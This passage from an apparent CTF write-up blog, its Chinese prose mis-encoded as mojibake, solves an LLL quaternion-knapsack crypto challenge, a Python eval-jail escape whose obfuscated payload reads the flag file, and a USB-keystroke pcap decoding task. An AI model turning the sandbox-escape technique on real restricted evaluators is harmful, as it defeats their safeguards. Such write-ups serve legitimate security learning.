subtable[k])</span><br><span class="line">    c2=c2.replace(k, subtable[k])</span><br><span class="line"></span><br><span class="line">c1=<span class="built_in">bytes</span>.fromhex(c1).decode()</span><br><span class="line">c2=<span class="built_in">bytes</span>.fromhex(c2).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c1)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c2[i])-(<span class="built_in">ord</span>(c1[i])-<span class="built_in">ord</span>(p1[i]))), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="knutsacque"><a href="#knutsacque" class="headerlink" title="knutsacque"></a>knutsacque</h3><p>å°ï¼Œ<del>ç„¶å¾Œä¸€ä¸‹é›£åº¦å°±ä¸‰ç´šè·³äº†</del><br><strong>chal.sage</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">F.&lt;i,j,k&gt; = QuaternionAlgebra(-<span class="number">1</span>, -<span class="number">1</span>)</span><br><span class="line">A = []</span><br><span class="line">B = [<span class="number">1</span>, i, j, k]</span><br><span class="line"></span><br><span class="line">msg_bin = <span class="string">b&quot;irisctf&#123;redacted_redacted_redacted_&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(msg_bin) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">msg = [F(<span class="built_in">sum</span>(Integer(msg_bin[idx+bi])*b <span class="keyword">for</span> bi, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(B))) <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg_bin), <span class="built_in">len</span>(B))]</span><br><span class="line">targ = <span class="number">2</span>^<span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">    a = F(<span class="built_in">sum</span>(secrets.randbelow(targ)*b <span class="keyword">for</span> b <span class="keyword">in</span> B))</span><br><span class="line">    A.append(a)</span><br><span class="line"></span><br><span class="line">sm = F(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">    sm += msg[idx] * A[idx]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A =&quot;</span>, A)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s =&quot;</span>, sm)</span><br></pre></td></tr></table></figure>
<p>ç°¡å–®ä¾†èªªï¼Œé€™å°±æ˜¯ä¸€å€‹å½¢å¦‚ $ax+by+cz&#x3D;d$ çš„ä¸å®šæ–¹ç¨‹â€¦å—(åªæ˜¯æœ‰ä¹é …)ï¼Ÿ<br>ä¸¦æ²’æœ‰ï¼Œå®ƒèª¿ç”¨åˆ°äº†å››å…ƒæ•¸  </p>
<p><img src="https://hackmd.io/_uploads/S1FzZnUUye.png" alt="image">  </p>
<p>è€Œå››å…ƒæ•¸æœ‰è‡ªå·±çš„ä¹˜æ³•è¦å‰‡ï¼Œæœ€é¡¯è€Œæ˜“è¦‹çš„å°±æ˜¯å®ƒä¸æ»¿è¶³äº¤æ›ç‡<br>å¹¾å€‹è§€å¯Ÿï¼š  </p>
<ul>
<li>æ‰€æœ‰çš„å››å…ƒæ•¸ä¹˜æ³•éƒ½å¯ä»¥è®ŠæˆæŸç¨®çŸ©é™£è®Šæ›ï¼Œè®Šæ›å¾Œå°±è®Šæˆå››æ¢ä¸å®šæ–¹ç¨‹  </li>
<li>æ¯ä¸€å€‹å­—æ¯çš„ ascii åœ¨ 2^7 é™„è¿‘ï¼Œä½†ä»–çµ¦çš„åƒæ•¸é‡ç´šéƒ½åœ¨ 2^64ï¼Œæœ‰è½å·®å¯èƒ½å¯ä»¥ LLL</li>
</ul>
<p>é¦–å…ˆæ˜¯è®Šæ›ç¨‹çŸ©é™£ä¹˜æ³•ï¼Œå°ç…§ä¸Šè¡¨ï¼Œå¦‚æœå…©å€‹å››å…ƒæ•¸ $A \times B &#x3D; C$ï¼Œé‚£ä»Šå¤©å¯ä»¥å¯«ä½œï¼š<br>$$<br>A_{array}&#x3D;<br>\begin{pmatrix}<br>A_1 \newline<br>A_i \newline<br>A_j \newline<br>A_k \newline<br>\end{pmatrix}<br>$$</p>
<p>$$<br>B_{array}&#x3D;<br>\begin{pmatrix}<br>B_1 &amp; -B_i &amp; -B_j &amp; -B_k \newline<br>B_i &amp; B_1 &amp; B_k &amp; -B_j \newline<br>B_j &amp; -B_k &amp; B_1 &amp; B_i \newline<br>B_k &amp; B_j &amp; -B_i &amp; B_1 \newline<br>\end{pmatrix}<br>$$</p>
<p>ä¸‹æ¨™å°±ä»£è¡¨ä»–å€‘åœ¨è©²é …çš„ä¿‚æ•¸ï¼Œä¸¦ä¸”é€™æœƒæ»¿è¶³ï¼š<br>$A \times B&#x3D;B_{array} \times A_{array}$</p>
<p>æŠŠé¡Œç›®çµ¦çš„Aéƒ½è½‰æˆçŸ©é™£å¾Œï¼Œæ¥ä¸‹ä¾†æ˜¯ LLL<br>æœ¬ä¾†æˆ‘æƒ³ç”¨ä¸€æ¢ç­‰å¼é…æˆé¡ä¼¼é€™æ¨£å°±çµæŸäº†ï¼š<br>$$<br>\begin{pmatrix}<br>A_{11} &amp; 1 &amp; 0 &amp; â€¦ &amp; 0 \newline<br>-A_{1i} &amp; 0 &amp; 1 &amp; â€¦ &amp; 0 \newline<br>â€¦ &amp; â€¦ &amp; â€¦ &amp; â€¦\newline<br>-s[0] &amp; 0 &amp; 0 &amp; â€¦ &amp; BIG \newline<br>\end{pmatrix}<br>$$<br>ä¸­é–“å…± 36 é …ï¼Œå°±æ˜¯9å€‹Aå±•é–‹æˆçŸ©é™£å¾Œçš„ä¿‚æ•¸<br><del>ä½†ä»Šå¤©å³ä¾¿ flag åªæœ‰ 8 å€‹å­—å…ƒ LLL å‡ºä¾†éƒ½æœ‰èª¤å·®</del><br>æ‰€ä»¥æˆ‘å¹«ä»–å€‘é…é‡æ‹‰å¤§å·®è·ï¼Œæœ€å·¦è®Šéƒ½ä¹˜ä»¥ 100ï¼Œçµ‚æ–¼å¯ä»¥é 8 å€‹å­—å…ƒ â€¦<br>ä½†æˆ‘å°±åœ¨æƒ³ï¼Œå¾Œé¢æ€éº¼è¾¦ï¼Ÿ<br>æ­¤æ™‚æ³¨æ„åˆ°åªæœ‰ä¸€æ¢ç®—å¼æœ‰è¢«ä½¿ç”¨ï¼Œä½†ç¸½å…±æœƒå‡ºç¾å››æ¢ï¼Œæ‰€ä»¥å®ƒå€‘å››å€‹ä¸€èµ·æ‹¿ä¾†ç´„æŸé€™å€‹æ–¹ç¨‹ï¼š<br>$$<br>\begin{pmatrix}<br>A_{11} \times 100 &amp; A_{1i} \times 100 &amp; A_{1j} \times 100 &amp; A_{1k} \times 100 &amp; 1 &amp; 0 &amp; â€¦ &amp; 0 \newline<br>-A_{1i} \times 100 &amp; A_{11} \times 100 &amp; -A_{1k} \times 100 &amp; A_{1j} \times 100 &amp; 1 &amp; 0 &amp; â€¦ &amp; 0 \newline<br>â€¦ &amp; â€¦ &amp; â€¦ &amp; â€¦\newline<br>-s[0] \times 100 &amp; -s[1] \times 100 &amp; -s[2] \times 100 &amp; -s[3] \times 100 &amp; 0 &amp; 0 &amp; â€¦ &amp; BIG \newline<br>\end{pmatrix}<br>$$<br>æœ€å¾Œé–‹ LLL å‡ºä¾†éæ¿¾å°±æ‹¿åˆ° flag äº†ï¼Œç‰¹åˆ¥æ³¨æ„å‰å…«å€‹å­—å…ƒå·²ç¶“æœ‰äº†æ‰€ä»¥å…¶å¯¦å¯ä»¥å…ˆæ‰£æ‰ï¼š  </p>
<p><strong>solve.sage</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## init</span></span><br><span class="line"></span><br><span class="line">F.&lt;i,j,k&gt; = QuaternionAlgebra(-<span class="number">1</span>, -<span class="number">1</span>)</span><br><span class="line">LEN = <span class="number">28</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## quater to matrix for LLL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quater2matrix</span>(<span class="params">qq</span>):</span><br><span class="line">    <span class="keyword">return</span> [[qq[<span class="number">0</span>], -qq[<span class="number">1</span>], -qq[<span class="number">2</span>], -qq[<span class="number">3</span>]],</span><br><span class="line">           [qq[<span class="number">1</span>], qq[<span class="number">0</span>], qq[<span class="number">3</span>], -qq[<span class="number">2</span>]],</span><br><span class="line">           [qq[<span class="number">2</span>], -qq[<span class="number">3</span>], qq[<span class="number">0</span>], qq[<span class="number">1</span>]],</span><br><span class="line">           [qq[<span class="number">3</span>], qq[<span class="number">2</span>], -qq[<span class="number">1</span>], qq[<span class="number">0</span>]]]</span><br><span class="line"></span><br><span class="line"><span class="comment">## oringinal datas</span></span><br><span class="line"></span><br><span class="line">A = [<span class="number">17182433425281628234</span> + <span class="number">14279655808574179137</span>*i + <span class="number">8531159707880760053</span>*j + <span class="number">10324521189909330699</span>*k, <span class="number">10979190813462137563</span> + <span class="number">11958433776450130274</span>*i + <span class="number">10360430094019091456</span>*j + <span class="number">11669398524919455091</span>*k, <span class="number">3230073756301653559</span> + <span class="number">4778309388978960703</span>*i + <span class="number">7991444794442975980</span>*j + <span class="number">11596790291939515343</span>*k, <span class="number">11946083696500480600</span> + <span class="number">18097491527846518653</span>*i + <span class="number">5640046632870036155</span>*j + <span class="number">2308502738741771335</span>*k, <span class="number">12639949829592355838</span> + <span class="number">12578487825594881151</span>*i + <span class="number">5989294895593982847</span>*j + <span class="number">9055819202108394307</span>*k, <span class="number">15962426286361116943</span> + <span class="number">6558955524158439283</span>*i + <span class="number">2284893063407554440</span>*j + <span class="number">14331331998172190719</span>*k, <span class="number">14588723113888416852</span> + <span class="number">432503514368407804</span>*i + <span class="number">11024468666631962695</span>*j + <span class="number">10056344423714511721</span>*k, <span class="number">2058233428417594677</span> + <span class="number">7708470259314925062</span>*i + <span class="number">7418836888786246673</span>*j + <span class="number">14461629396829662899</span>*k, <span class="number">4259431518253064343</span> + <span class="number">9872607911298470259</span>*i + <span class="number">16758451559955816076</span>*j + <span class="number">16552476455431860146</span>*k]</span><br><span class="line">s = -<span class="number">17021892191322790357078</span> + <span class="number">19986226329660045481112</span>*i + <span class="number">15643261273292061217693</span>*j + <span class="number">21139791497063095405696</span>*k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## we already known</span></span><br><span class="line"></span><br><span class="line">B = [<span class="number">1</span>, i, j, k]</span><br><span class="line">msg_bin=<span class="string">b&quot;irisctf&#123;&quot;</span></span><br><span class="line">msg = [F(<span class="built_in">sum</span>(Integer(msg_bin[idx+bi])*b <span class="keyword">for</span> bi, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(B))) <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg_bin), <span class="built_in">len</span>(B))]</span><br><span class="line">sm = F(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">    sm += msg[idx] * A[idx]</span><br><span class="line"></span><br><span class="line"><span class="comment">## minus</span></span><br><span class="line"></span><br><span class="line">s-=sm</span><br><span class="line">A=A[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment">## Exploit</span></span><br><span class="line"></span><br><span class="line">AA = [[<span class="number">0</span>]*LEN <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(LEN//<span class="number">4</span>):</span><br><span class="line">    tmp_arr = quater2matrix(A[i1])</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            AA[i2][i3+<span class="number">4</span>*i1] = tmp_arr[i2][i3]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">vec, val</span>):</span><br><span class="line">    flag=<span class="string">&#x27;irisctf&#123;&#x27;</span></span><br><span class="line">    M = [[<span class="number">0</span>]*(LEN+<span class="number">5</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(LEN+<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(LEN):</span><br><span class="line">        M[i1][i1+<span class="number">4</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            M[i1][i2] = vec[i2][i1]*<span class="number">100</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        M[-<span class="number">1</span>][i1] = -val[i1]*<span class="number">100</span></span><br><span class="line"></span><br><span class="line">    M[-<span class="number">1</span>][-<span class="number">1</span>] = <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">512</span>)</span><br><span class="line">    M = Matrix(ZZ, M)</span><br><span class="line">    ans = M.LLL()</span><br><span class="line">    <span class="keyword">for</span> tmp <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">sum</span>(tmp[<span class="number">0</span>:<span class="number">4</span>])==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> i1 <span class="keyword">in</span> tmp[:-<span class="number">1</span>]:</span><br><span class="line">                flag+=<span class="built_in">chr</span>(i1)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">solve(AA, s)</span><br><span class="line"><span class="comment"># irisctf&#123;wow_i_cant_believe_its_lll!&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Cobraâ€™s-Den"><a href="#Cobraâ€™s-Den" class="headerlink" title="Cobraâ€™s Den"></a>Cobraâ€™s Den</h3><p>ä¸€å€‹ pyjailï¼š  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">all_builtins = <span class="built_in">dir</span>(builtins)</span><br><span class="line">filtered_builtins = &#123;name: <span class="built_in">getattr</span>(builtins, name) <span class="keyword">for</span> name <span class="keyword">in</span> all_builtins <span class="keyword">if</span> <span class="built_in">len</span>(name) &lt;= <span class="number">4</span>&#125;</span><br><span class="line">filtered_builtins.update(&#123;<span class="string">&#x27;print&#x27;</span>: <span class="built_in">print</span>&#125;)</span><br><span class="line"></span><br><span class="line">whitelist = <span class="string">&quot;&lt;ph[(cobras.den)]+~&quot;</span></span><br><span class="line">security_check = <span class="keyword">lambda</span> s: <span class="built_in">any</span>(c <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">for</span> c <span class="keyword">in</span> s) <span class="keyword">or</span> <span class="built_in">len</span>(s) &gt; <span class="number">1115</span> <span class="keyword">or</span> s.count(<span class="string">&#x27;.&#x27;</span>) &gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Good luck!&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = <span class="built_in">input</span>(<span class="string">&quot;Input: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> security_check(cmd):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No dice!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">eval</span>(<span class="string">f&quot;print(<span class="subst">&#123;cmd&#125;</span>)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: filtered_builtins&#125;)</span><br><span class="line">        <span class="keyword">except</span> SyntaxError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Syntax error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>è¦è®€å–flagæª”æ¡ˆï¼Œå…ˆ RECON ä¸€ä¸‹é‚„æœ‰å“ªäº› builtins å¯ä»¥ç”¨ï¼š  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">abs</span><br><span class="line">chr</span><br><span class="line">hash</span><br><span class="line">open</span><br><span class="line">ord</span><br><span class="line">repr</span><br></pre></td></tr></table></figure>
<p>åˆ—èˆ‰å‡ºä¾†æ˜¯é€™äº”å€‹ï¼Œå…¶ä¸­ chr å¯ä»¥çµåˆ whitelist æœ‰çš„ <code>+()</code> é€ å‡ºå¾ˆå¤šå­—ä¸²<br>æ¯”è¼ƒæœ‰è¶£çš„æ˜¯ reprï¼Œä»–å°±æ˜¯ print å‡½æ•¸çš„å­—ä¸²å†å­—ä¸²åŒ–ï¼š  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repr(&#x27;\x00&#x27;) = &quot;&#x27;\\x00&#x27;&quot;</span><br></pre></td></tr></table></figure>
<p>å†ä¾†ï¼Œ<code>[]&lt;[[]]</code>æ˜¯ trueï¼Œæ‰€ä»¥æ˜¯ 1ï¼Œå¯ä»¥ä¸€ç›´åŠ ï¼Œä½†å› ç‚ºæœ‰è¼¸å…¥å¤§å°é™åˆ¶æ‰€ä»¥å‹¢å¿…å¾—æ‰¾åˆ°æ–¹æ³•æ¸›å°‘ä½¿ç”¨æ¬¡æ•¸ï¼Œæ–¹æ³•å°±æ˜¯å¾å‰›å‰›çš„ repr æŠŠ x å­—æ¯æå–å‡ºä¾†ï¼Œå› ç‚º payload æœƒæ˜¯ <code>open(æ§‹é€ å‡ºä¾†çš„flagå­—ä¸²).read()</code>ï¼Œæ‰€ä»¥å®ƒç®—æ˜¯ç›¸å°æ¥è¿‘æˆ‘å€‘è¦çš„å­—æ¯çš„å€¼<br>æœ€å¾Œå°±æ˜¯å¯«ç”Ÿæˆä»»æ„å­—æ¯çš„å‡½æ•¸ï¼Œå†æ³¨æ„åˆ° x æ¯” f, l, a, g ä»»ä½•ä¸€å€‹éƒ½é‚„è¦å¤§ï¼Œæ‰€ä»¥å¾ˆå¯èƒ½è¦ç”¨æ¸›çš„å» chr å‡½æ•¸è£¡ï¼Œä½†æ²’æœ‰æ¸›ç¬¦è™Ÿå¯ä»¥é€šéï¼Œæ”¹ç”¨ ~ çš„ä½å…ƒé‹ç®—é€ å‡ºè² æ•¸  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">ch</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;chr(ord(repr(chr(([]&lt;[])))[([]&lt;[[]])+([]&lt;[[]])])+~(<span class="subst">&#123;(<span class="string">&#x27;([]&lt;[[]])+&#x27;</span>*~(<span class="built_in">ord</span>(ch)-<span class="number">120</span>))[:-<span class="number">1</span>]&#125;</span>))&quot;</span></span><br></pre></td></tr></table></figure>
<p><del>å°å·§å¯æ„›è€Œé›£æ‡‚çš„ä¸€è¡Œ</del><br>æœ€å¾Œç”Ÿå‡ºçš„ Payloadï¼š  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">repr</span>(<span class="built_in">chr</span>(([]&lt;[])))[([]&lt;[[]])+([]&lt;[[]])])+~(([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])))+<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">repr</span>(<span class="built_in">chr</span>(([]&lt;[])))[([]&lt;[[]])+([]&lt;[[]])])+~(([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])))+<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">repr</span>(<span class="built_in">chr</span>(([]&lt;[])))[([]&lt;[[]])+([]&lt;[[]])])+~(([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])))+<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">repr</span>(<span class="built_in">chr</span>(([]&lt;[])))[([]&lt;[[]])+([]&lt;[[]])])+~(([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])+([]&lt;[[]])))).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># irisctf&#123;pyth0n_has_s(+([]&lt;[]))me_whacky_sh(+([]&lt;[[]]))t&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="FORENS"><a href="#FORENS" class="headerlink" title="FORENS"></a>FORENS</h2><h3 id="deldeldel"><a href="#deldeldel" class="headerlink" title="deldeldel"></a>deldeldel</h3><p><img src="https://hackmd.io/_uploads/rynFs28Ike.png" alt="image"><br>æ‰“é–‹çœ‹åˆ°å°±æ˜¯ä¸€å€‹ USB åŒ…ï¼Œæª¢æŸ¥å’Œæœå°‹äº†ä¸€ä¸‹è »åƒéµç›¤è¼¸å…¥ä¿¡è™Ÿçš„ï¼Œç”¨ tshark æŠŠè³‡è¨Šå€’å‡ºä¾†  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r klogger.pcapng -T fields -e usb.capdata &gt; usb.data</span><br></pre></td></tr></table></figure>
<p>æœ€å¾Œå»ç¶²è·¯ä¸Šæ‹”ä¸€å€‹è§£è®€å™¨å‡ºä¾†å°±å¥½ï¼š  </p>
<p><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">              <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;r&quot;</span>,</span><br><span class="line">              <span class="string">&quot;16&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">              <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>: <span 